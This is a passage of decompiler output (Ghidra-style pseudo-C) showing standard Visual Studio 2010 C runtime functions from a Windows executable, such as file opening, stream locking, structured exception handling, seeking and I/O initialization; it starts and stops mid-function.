        if ((DVar4 != 0) ||
           (eVar3 = _wcscpy_s((wchar_t *)&DAT_00421c22,0x2fb,u_<program_name_unknown>_0041ac7c),
           eVar3 == 0)) {
          sVar5 = _wcslen((wchar_t *)&DAT_00421c22);
          if (0x3c < sVar5 + 1) {
            sVar5 = _wcslen((wchar_t *)&DAT_00421c22);
            eVar3 = _wcsncpy_s((wchar_t *)((int)&DAT_00421bac + sVar5 * 2),
                               0x2fb - ((int)(sVar5 * 2 + -0x76) >> 1),(wchar_t *)&DAT_0041ac74,3);
            if (eVar3 != 0) goto LAB_0040cf49;
          }
          eVar3 = _wcscat_s((wchar_t *)&DAT_00421bf0,0x314,(wchar_t *)&DAT_0041ac6c);
          if ((eVar3 == 0) &&
             (eVar3 = _wcscat_s((wchar_t *)&DAT_00421bf0,0x314,local_200), eVar3 == 0)) {
            ___crtMessageBoxW((LPCWSTR)&DAT_00421bf0,u_AMicrosoft_Visual_C___Runtime_Li_0041ac1e + 1
                              ,0x12010);
            goto LAB_0040d024;
          }
        }
      }
LAB_0040cf49:
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
  }
LAB_0040d024:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __FF_MSGBANNER
// 
// Library: Visual Studio 2010 Release

void __cdecl __FF_MSGBANNER(void)

{
  int iVar1;
  
  iVar1 = __set_error_mode(3);
  if (iVar1 != 1) {
    iVar1 = __set_error_mode(3);
    if (iVar1 != 0) {
      return;
    }
    if (DAT_00420040 != 1) {
      return;
    }
  }
  __NMSG_WRITE(0xfc);
  __NMSG_WRITE(0xff);
  return;
}



// Library Function - Single Match
//  __heap_init
// 
// Library: Visual Studio 2010 Release

int __cdecl __heap_init(void)

{
  DAT_00422218 = HeapCreate(0,0x1000,0);
  return (uint)(DAT_00422218 != (HANDLE)0x0);
}



void __cdecl FUN_0040d08a(undefined4 param_1)

{
  DAT_0042221c = param_1;
  return;
}



// Library Function - Single Match
//  __callnewh
// 
// Library: Visual Studio 2010 Release

int __cdecl __callnewh(size_t _Size)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)DecodePointer(DAT_0042221c);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(_Size);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



undefined ** FUN_0040d0c1(void)

{
  return &PTR_DAT_004201c8;
}



// Library Function - Single Match
//  __lock_file
// 
// Library: Visual Studio 2010 Release

void __cdecl __lock_file(FILE *_File)

{
  if ((_File < &PTR_DAT_004201c8) || ((FILE *)&DAT_00420428 < _File)) {
    EnterCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  }
  else {
    __lock(((int)&_File[-0x2100f]._bufsiz >> 5) + 0x10);
    _File->_flag = _File->_flag | 0x8000;
  }
  return;
}



// Library Function - Single Match
//  __lock_file2
// 
// Library: Visual Studio 2010 Release

void __cdecl __lock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    __lock(_Index + 0x10);
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) | 0x8000;
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  __unlock_file
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __unlock_file(FILE *_File)

{
  if (((FILE *)((int)&DAT_004201c4 + 3U) < _File) && (_File < (FILE *)0x420429)) {
    _File->_flag = _File->_flag & 0xffff7fff;
    FUN_004127a9(((int)&_File[-0x2100f]._bufsiz >> 5) + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



// Library Function - Single Match
//  __unlock_file2
// 
// Library: Visual Studio 2010 Release

void __cdecl __unlock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) & 0xffff7fff;
    FUN_004127a9(_Index + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wopenfile
// 
// Library: Visual Studio 2010 Release

FILE * __cdecl __wopenfile(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag,FILE *_File)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  wchar_t wVar4;
  int *piVar5;
  uint uVar6;
  int iVar7;
  errno_t eVar8;
  uint _OpenFlag;
  wchar_t *pwVar9;
  wchar_t *pwVar10;
  int local_c;
  uint local_8;
  
  bVar2 = false;
  local_c = 0;
  bVar3 = false;
  for (pwVar10 = _Mode; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  wVar4 = *pwVar10;
  if (wVar4 == L'a') {
    _OpenFlag = 0x109;
LAB_0040d2de:
    local_8 = DAT_004225e0 | 2;
  }
  else {
    if (wVar4 != L'r') {
      if (wVar4 != L'w') {
        piVar5 = __errno();
        *piVar5 = 0x16;
        FUN_0040c664();
        return (FILE *)0x0;
      }
      _OpenFlag = 0x301;
      goto LAB_0040d2de;
    }
    _OpenFlag = 0;
    local_8 = DAT_004225e0 | 1;
  }
  pwVar10 = pwVar10 + 1;
  wVar4 = *pwVar10;
  bVar1 = true;
  if (wVar4 != L'\0') {
    do {
      if (!bVar1) break;
      uVar6 = (uint)(ushort)wVar4;
      if (uVar6 < 0x54) {
        if (uVar6 == 0x53) {
          if (local_c != 0) goto LAB_0040d40c;
          local_c = 1;
          _OpenFlag = _OpenFlag | 0x20;
        }
        else if (uVar6 != 0x20) {
          if (uVar6 == 0x2b) {
            if ((_OpenFlag & 2) != 0) goto LAB_0040d40c;
            _OpenFlag = _OpenFlag & 0xfffffffe | 2;
            local_8 = local_8 & 0xfffffffc | 0x80;
          }
          else if (uVar6 == 0x2c) {
            bVar3 = true;
LAB_0040d40c:
            bVar1 = false;
          }
          else if (uVar6 == 0x44) {
            if ((_OpenFlag & 0x40) != 0) goto LAB_0040d40c;
            _OpenFlag = _OpenFlag | 0x40;
          }
          else if (uVar6 == 0x4e) {
            _OpenFlag = _OpenFlag | 0x80;
          }
          else {
            if (uVar6 != 0x52) goto LAB_0040d4d8;
            if (local_c != uVar6 - 0x52) goto LAB_0040d40c;
            local_c = 1;
            _OpenFlag = _OpenFlag | 0x10;
          }
        }
      }
      else if (uVar6 == 0x54) {
        if ((_OpenFlag & 0x1000) != 0) goto LAB_0040d40c;
        _OpenFlag = _OpenFlag | 0x1000;
      }
      else if (uVar6 == 0x62) {
        if ((_OpenFlag & 0xc000) != 0) goto LAB_0040d40c;
        _OpenFlag = _OpenFlag | 0x8000;
      }
      else if (uVar6 == 99) {
        if (bVar2) goto LAB_0040d40c;
        local_8 = local_8 | 0x4000;
        bVar2 = true;
      }
      else if (uVar6 == 0x6e) {
        if (bVar2) goto LAB_0040d40c;
        local_8 = local_8 & 0xffffbfff;
        bVar2 = true;
      }
      else {
        if (uVar6 != 0x74) goto LAB_0040d4d8;
        if ((_OpenFlag & 0xc000) != 0) goto LAB_0040d40c;
        _OpenFlag = _OpenFlag | 0x4000;
      }
      pwVar10 = pwVar10 + 1;
      wVar4 = *pwVar10;
    } while (wVar4 != L'\0');
    if (bVar3) {
      for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
      iVar7 = _wcsncmp((wchar_t *)&DAT_0041ace0,pwVar10,3);
      if (iVar7 != 0) goto LAB_0040d4d8;
      for (pwVar10 = pwVar10 + 3; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
      if (*pwVar10 != L'=') goto LAB_0040d4d8;
      do {
        pwVar9 = pwVar10;
        pwVar10 = pwVar9 + 1;
      } while (*pwVar10 == L' ');
      iVar7 = __wcsnicmp(pwVar10,u_UTF_8_0041ace8,5);
      if (iVar7 == 0) {
        pwVar10 = pwVar9 + 6;
        _OpenFlag = _OpenFlag | 0x40000;
      }
      else {
        iVar7 = __wcsnicmp(pwVar10,u_UTF_16LE_0041acf4,8);
        if (iVar7 == 0) {
          pwVar10 = pwVar9 + 9;
          _OpenFlag = _OpenFlag | 0x20000;
        }
        else {
          iVar7 = __wcsnicmp(pwVar10,u_UNICODE_0041ad08,7);
          if (iVar7 != 0) goto LAB_0040d4d8;
          pwVar10 = pwVar9 + 8;
          _OpenFlag = _OpenFlag | 0x10000;
        }
      }
    }
  }
  for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  if (*pwVar10 == L'\0') {
    eVar8 = __wsopen_s((int *)&_Mode,_Filename,_OpenFlag,_ShFlag,0x180);
    if (eVar8 != 0) {
      return (FILE *)0x0;
    }
    _DAT_00422224 = _DAT_00422224 + 1;
    _File->_flag = local_8;
    _File->_cnt = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_tmpfname = (char *)0x0;
    _File->_file = (int)_Mode;
    return _File;
  }
LAB_0040d4d8:
  piVar5 = __errno();
  *piVar5 = 0x16;
  FUN_0040c664();
  return (FILE *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __getstream
// 
// Library: Visual Studio 2010 Release

FILE * __cdecl __getstream(void)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  void *pvVar4;
  BOOL BVar5;
  int _Index;
  FILE *pFVar6;
  FILE *_File;
  
  pFVar6 = (FILE *)0x0;
  __lock(1);
  _Index = 0;
  do {
    _File = pFVar6;
    if (DAT_00424960 <= _Index) {
LAB_0040d628:
      if (_File != (FILE *)0x0) {
        _File->_flag = _File->_flag & 0x8000;
        _File->_cnt = 0;
        _File->_base = (char *)0x0;
        _File->_ptr = (char *)0x0;
        _File->_tmpfname = (char *)0x0;
        _File->_file = -1;
      }
      FUN_0040d659();
      return _File;
    }
    piVar1 = (int *)(DAT_00423940 + _Index * 4);
    if (*piVar1 == 0) {
      pvVar4 = __malloc_crt(0x38);
      *(void **)(DAT_00423940 + _Index * 4) = pvVar4;
      if (pvVar4 != (void *)0x0) {
        BVar5 = InitializeCriticalSectionAndSpinCount
                          ((LPCRITICAL_SECTION)(*(int *)(DAT_00423940 + _Index * 4) + 0x20),4000);
        if (BVar5 == 0) {
          _free(*(void **)(DAT_00423940 + _Index * 4));
          *(undefined4 *)(DAT_00423940 + _Index * 4) = 0;
        }
        else {
          EnterCriticalSection((LPCRITICAL_SECTION)(*(int *)(DAT_00423940 + _Index * 4) + 0x20));
          _File = *(FILE **)(DAT_00423940 + _Index * 4);
          _File->_flag = 0;
        }
      }
      goto LAB_0040d628;
    }
    uVar2 = *(uint *)(*piVar1 + 0xc);
    if (((uVar2 & 0x83) == 0) && ((uVar2 & 0x8000) == 0)) {
      if ((_Index - 3U < 0x11) && (iVar3 = __mtinitlocknum(_Index + 0x10), iVar3 == 0))
      goto LAB_0040d628;
      __lock_file2(_Index,*(void **)(DAT_00423940 + _Index * 4));
      _File = *(FILE **)(DAT_00423940 + _Index * 4);
      if ((*(byte *)&_File->_flag & 0x83) == 0) goto LAB_0040d628;
      __unlock_file2(_Index,_File);
    }
    _Index = _Index + 1;
  } while( true );
}



void FUN_0040d659(void)

{
  FUN_004127a9(1);
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *unaff_FS_OFFSET;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00420044 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  *unaff_FS_OFFSET = (int)local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
// 
// Library: Visual Studio

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 *unaff_FS_OFFSET;
  undefined4 unaff_retaddr;
  
  *unaff_FS_OFFSET = unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __except_handler4
// 
// Library: Visual Studio 2010 Release

undefined4 __cdecl __except_handler4(PEXCEPTION_RECORD param_1,PVOID param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  BOOL BVar3;
  PVOID pvVar4;
  int *piVar5;
  PEXCEPTION_RECORD local_1c;
  undefined4 local_18;
  PVOID *local_14;
  undefined4 local_10;
  PVOID local_c;
  char local_5;
  
  piVar5 = (int *)(*(uint *)((int)param_2 + 8) ^ DAT_00420044);
  local_5 = '\0';
  local_10 = 1;
  iVar1 = (int)param_2 + 0x10;
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  pvVar4 = param_2;
  if ((*(byte *)&param_1->ExceptionFlags & 0x66) == 0) {
    *(PEXCEPTION_RECORD **)((int)param_2 + -4) = &local_1c;
    pvVar4 = *(PVOID *)((int)param_2 + 0xc);
    local_1c = param_1;
    local_18 = param_3;
    if (pvVar4 == (PVOID)0xfffffffe) {
      return local_10;
    }
    do {
      local_14 = (PVOID *)(piVar5 + (int)pvVar4 * 3 + 4);
      local_c = *local_14;
      if ((undefined *)piVar5[(int)pvVar4 * 3 + 5] != (undefined *)0x0) {
        iVar2 = __EH4_CallFilterFunc_8((undefined *)piVar5[(int)pvVar4 * 3 + 5]);
        local_5 = '\x01';
        if (iVar2 < 0) {
          local_10 = 0;
          goto LAB_0040d778;
        }
        if (0 < iVar2) {
          if (((param_1->ExceptionCode == 0xe06d7363) &&
              (PTR____DestructExceptionObject_0041e62c != (undefined *)0x0)) &&
             (BVar3 = __IsNonwritableInCurrentImage((PBYTE)&PTR____DestructExceptionObject_0041e62c)
             , BVar3 != 0)) {
            (*(code *)PTR____DestructExceptionObject_0041e62c)(param_1,1);
          }
          __EH4_GlobalUnwind2_8(param_2,param_1);
          if (*(PVOID *)((int)param_2 + 0xc) != pvVar4) {
            __EH4_LocalUnwind_16((int)param_2,(uint)pvVar4,iVar1,&DAT_00420044);
          }
          *(PVOID *)((int)param_2 + 0xc) = local_c;
          if (*piVar5 != -2) {
            ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
          }
          ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
          __EH4_TransferToHandler_8((undefined *)local_14[2]);
          goto LAB_0040d83f;
        }
      }
      pvVar4 = local_c;
    } while (local_c != (PVOID)0xfffffffe);
    if (local_5 == '\0') {
      return local_10;
    }
  }
  else {
LAB_0040d83f:
    if (*(int *)((int)pvVar4 + 0xc) == -2) {
      return local_10;
    }
    __EH4_LocalUnwind_16((int)pvVar4,0xfffffffe,iVar1,&DAT_00420044);
  }
LAB_0040d778:
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  return local_10;
}



// Library Function - Single Match
//  __local_unwind4
// 
// Library: Visual Studio 2010 Release

void __cdecl __local_unwind4(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 *unaff_FS_OFFSET;
  undefined4 uStack_28;
  undefined *puStack_24;
  uint local_20;
  uint uStack_1c;
  int iStack_18;
  uint *puStack_14;
  
  puStack_14 = param_1;
  iStack_18 = param_2;
  uStack_1c = param_3;
  puStack_24 = &LAB_0040d8f0;
  uStack_28 = *unaff_FS_OFFSET;
  local_20 = DAT_00420044 ^ (uint)&uStack_28;
  *unaff_FS_OFFSET = &uStack_28;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      __NLG_Notify(0x101);
      FUN_00413b84();
    }
  }
  *unaff_FS_OFFSET = uStack_28;
  return;
}



void FUN_0040d936(int param_1)

{
  __local_unwind4(*(uint **)(param_1 + 0x28),*(int *)(param_1 + 0x18),*(uint *)(param_1 + 0x1c));
  return;
}



// Library Function - Single Match
//  @_EH4_CallFilterFunc@8
// 
// Library: Visual Studio 2010 Release

void __fastcall __EH4_CallFilterFunc_8(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



// Library Function - Single Match
//  @_EH4_TransferToHandler@8
// 
// Library: Visual Studio 2010 Release

void __fastcall __EH4_TransferToHandler_8(undefined *UNRECOVERED_JUMPTABLE)

{
  __NLG_Notify(1);
                    // WARNING: Could not recover jumptable at 0x0040d980. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  @_EH4_GlobalUnwind2@8
// 
// Library: Visual Studio 2010 Release

void __fastcall __EH4_GlobalUnwind2_8(PVOID param_1,PEXCEPTION_RECORD param_2)

{
  RtlUnwind(param_1,(PVOID)0x40d996,param_2,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  @_EH4_LocalUnwind@16
// 
// Library: Visual Studio 2010 Release

void __fastcall __EH4_LocalUnwind_16(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  __local_unwind4(param_4,param_1,param_2);
  return;
}



// Library Function - Single Match
//  __lseek_nolock
// 
// Library: Visual Studio 2010 Release

long __cdecl __lseek_nolock(int _FileHandle,long _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  ulong uVar4;
  
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
    DVar3 = 0xffffffff;
  }
  else {
    DVar3 = SetFilePointer(hFile,_Offset,(PLONG)0x0,_Origin);
    if (DVar3 == 0xffffffff) {
      uVar4 = GetLastError();
    }
    else {
      uVar4 = 0;
    }
    if (uVar4 == 0) {
      pbVar1 = (byte *)((&DAT_00423840)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
      *pbVar1 = *pbVar1 & 0xfd;
    }
    else {
      __dosmaperr(uVar4);
      DVar3 = 0xffffffff;
    }
  }
  return DVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseek
// 
// Library: Visual Studio 2010 Release

long __cdecl __lseek(int _FileHandle,long _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  long local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00423834)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00423840)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00423840)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __lseek_nolock(_FileHandle,_Offset,_Origin);
        }
        FUN_0040daf3();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_0040c664();
  }
  return -1;
}



void FUN_0040daf3(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// Library Function - Single Match
//  __fileno
// 
// Library: Visual Studio 2010 Release

int __cdecl __fileno(FILE *_File)

{
  int *piVar1;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
    return -1;
  }
  return _File->_file;
}



// Library Function - Single Match
//  __flush
// 
// Library: Visual Studio 2010 Release

int __cdecl __flush(FILE *_File)

{
  int _FileHandle;
  uint uVar1;
  int iVar2;
  uint uVar3;
  char *_Buf;
  
  iVar2 = 0;
  if ((((byte)_File->_flag & 3) == 2) && ((_File->_flag & 0x108U) != 0)) {
    _Buf = _File->_base;
    uVar3 = (int)_File->_ptr - (int)_Buf;
    if (0 < (int)uVar3) {
      uVar1 = uVar3;
      _FileHandle = __fileno(_File);
      uVar1 = __write(_FileHandle,_Buf,uVar1);
      if (uVar1 == uVar3) {
        if ((char)_File->_flag < '\0') {
          _File->_flag = _File->_flag & 0xfffffffd;
        }
      }
      else {
        _File->_flag = _File->_flag | 0x20;
        iVar2 = -1;
      }
    }
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return iVar2;
}



// Library Function - Single Match
//  __fflush_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __fflush_nolock(FILE *_File)

{
  int iVar1;
  
  if (_File == (FILE *)0x0) {
    iVar1 = _flsall(0);
  }
  else {
    iVar1 = __flush(_File);
    if (iVar1 == 0) {
      if ((_File->_flag & 0x4000U) == 0) {
        iVar1 = 0;
      }
      else {
        iVar1 = __fileno(_File);
        iVar1 = __commit(iVar1);
        iVar1 = -(uint)(iVar1 != 0);
      }
    }
    else {
      iVar1 = -1;
    }
  }
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _flsall
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _flsall(int param_1)

{
  void **ppvVar1;
  void *_File;
  FILE *_File_00;
  int iVar2;
  int _Index;
  int local_28;
  int local_20;
  
  local_20 = 0;
  local_28 = 0;
  __lock(1);
  for (_Index = 0; _Index < DAT_00424960; _Index = _Index + 1) {
    ppvVar1 = (void **)(DAT_00423940 + _Index * 4);
    if ((*ppvVar1 != (void *)0x0) && (_File = *ppvVar1, (*(byte *)((int)_File + 0xc) & 0x83) != 0))
    {
      __lock_file2(_Index,_File);
      _File_00 = *(FILE **)(DAT_00423940 + _Index * 4);
      if ((_File_00->_flag & 0x83U) != 0) {
        if (param_1 == 1) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 != -1) {
            local_20 = local_20 + 1;
          }
        }
        else if ((param_1 == 0) && ((_File_00->_flag & 2U) != 0)) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 == -1) {
            local_28 = -1;
          }
        }
      }
      FUN_0040dc73();
    }
  }
  FUN_0040dca2();
  if (param_1 != 1) {
    local_20 = local_28;
  }
  return local_20;
}



void FUN_0040dc73(void)

{
  int unaff_ESI;
  
  __unlock_file2(unaff_ESI,*(void **)(DAT_00423940 + unaff_ESI * 4));
  return;
}



void FUN_0040dca2(void)

{
  FUN_004127a9(1);
  return;
}



// Library Function - Single Match
//  __ioinit
// 
// Library: Visual Studio 2010 Release

int __cdecl __ioinit(void)

{
  void *pvVar1;
  int iVar2;
  DWORD DVar3;
  BOOL BVar4;
  HANDLE pvVar5;
  UINT UVar6;
  UINT UVar7;
  HANDLE *ppvVar8;
  void **ppvVar9;
  uint uVar10;
  _STARTUPINFOW local_50;
  HANDLE *local_c;
  UINT *local_8;
  
  GetStartupInfoW(&local_50);
  pvVar1 = __calloc_crt(0x20,0x40);
  if (pvVar1 == (void *)0x0) {
    iVar2 = -1;
  }
  else {
    DAT_00423834 = 0x20;
    DAT_00423840 = pvVar1;
    if (pvVar1 < (void *)((int)pvVar1 + 0x800U)) {
      iVar2 = (int)pvVar1 + 5;
      do {
        *(undefined4 *)(iVar2 + -5) = 0xffffffff;
        *(undefined2 *)(iVar2 + -1) = 0xa00;
        *(undefined4 *)(iVar2 + 3) = 0;
        *(undefined2 *)(iVar2 + 0x1f) = 0xa00;
        *(undefined *)(iVar2 + 0x21) = 10;
        *(undefined4 *)(iVar2 + 0x33) = 0;
        *(undefined *)(iVar2 + 0x2f) = 0;
        uVar10 = iVar2 + 0x3b;
        iVar2 = iVar2 + 0x40;
      } while (uVar10 < (int)DAT_00423840 + 0x800U);
    }
    if ((local_50.cbReserved2 != 0) && ((UINT *)local_50.lpReserved2 != (UINT *)0x0)) {
      UVar6 = *(UINT *)local_50.lpReserved2;
      local_8 = (UINT *)((int)local_50.lpReserved2 + 4);
      local_c = (HANDLE *)((int)local_8 + UVar6);
      if (0x7ff < (int)UVar6) {
        UVar6 = 0x800;
      }
      UVar7 = UVar6;
      if ((int)DAT_00423834 < (int)UVar6) {
        ppvVar9 = (void **)&DAT_00423844;
        do {
          pvVar1 = __calloc_crt(0x20,0x40);
          UVar7 = DAT_00423834;
          if (pvVar1 == (void *)0x0) break;
          DAT_00423834 = DAT_00423834 + 0x20;
          *ppvVar9 = pvVar1;
          if (pvVar1 < (void *)((int)pvVar1 + 0x800U)) {
            iVar2 = (int)pvVar1 + 5;
            do {
              *(undefined4 *)(iVar2 + -5) = 0xffffffff;
              *(undefined4 *)(iVar2 + 3) = 0;
              *(byte *)(iVar2 + 0x1f) = *(byte *)(iVar2 + 0x1f) & 0x80;
              *(undefined4 *)(iVar2 + 0x33) = 0;
              *(undefined2 *)(iVar2 + -1) = 0xa00;
              *(undefined2 *)(iVar2 + 0x20) = 0xa0a;
              *(undefined *)(iVar2 + 0x2f) = 0;
              uVar10 = iVar2 + 0x3b;
              iVar2 = iVar2 + 0x40;
            } while (uVar10 < (int)*ppvVar9 + 0x800U);
          }
          ppvVar9 = ppvVar9 + 1;
          UVar7 = UVar6;
        } while ((int)DAT_00423834 < (int)UVar6);
      }
      uVar10 = 0;
      if (0 < (int)UVar7) {
        do {
          pvVar5 = *local_c;
          if ((((pvVar5 != (HANDLE)0xffffffff) && (pvVar5 != (HANDLE)0xfffffffe)) &&
              ((*(byte *)local_8 & 1) != 0)) &&
             (((*(byte *)local_8 & 8) != 0 || (DVar3 = GetFileType(pvVar5), DVar3 != 0)))) {
            ppvVar8 = (HANDLE *)((uVar10 & 0x1f) * 0x40 + (int)(&DAT_00423840)[(int)uVar10 >> 5]);
            *ppvVar8 = *local_c;
            *(byte *)(ppvVar8 + 1) = *(byte *)local_8;
            BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
            if (BVar4 == 0) {
              return -1;
            }
            ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
          }
          local_c = local_c + 1;
          uVar10 = uVar10 + 1;
          local_8 = (UINT *)((int)local_8 + 1);
        } while ((int)uVar10 < (int)UVar7);
      }
    }
    iVar2 = 0;
    do {
      ppvVar8 = (HANDLE *)(iVar2 * 0x40 + (int)DAT_00423840);
      if ((*ppvVar8 == (HANDLE)0xffffffff) || (*ppvVar8 == (HANDLE)0xfffffffe)) {
        *(undefined *)(ppvVar8 + 1) = 0x81;
        if (iVar2 == 0) {
          DVar3 = 0xfffffff6;
        }
        else {
          DVar3 = 0xfffffff5 - (iVar2 != 1);
        }
        pvVar5 = GetStdHandle(DVar3);
        if (((pvVar5 == (HANDLE)0xffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar3 = GetFileType(pvVar5), DVar3 == 0)) {
          *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          *ppvVar8 = (HANDLE)0xfffffffe;
        }
        else {
          *ppvVar8 = pvVar5;
          if ((DVar3 & 0xff) == 2) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          }
          else if ((DVar3 & 0xff) == 3) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 8;
          }
          BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
          if (BVar4 == 0) {
            return -1;
          }
          ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
        }
      }
      else {
        *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x80;
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 < 3);
    SetHandleCount(DAT_00423834);
    iVar2 = 0;
  }
  return iVar2;
}



// Library Function - Single Match
//  __filbuf
// 
// Library: Visual Studio 2010 Release

int __cdecl __filbuf(FILE *_File)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  char *_DstBuf;
  
  if (_File == (FILE *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_0040c664();
  }
  else {
    uVar4 = _File->_flag;
    if (((uVar4 & 0x83) != 0) && ((uVar4 & 0x40) == 0)) {
      if ((uVar4 & 2) == 0) {
        _File->_flag = uVar4 | 1;
        if ((uVar4 & 0x10c) == 0) {
          __getbuf(_File);
        }
        else {
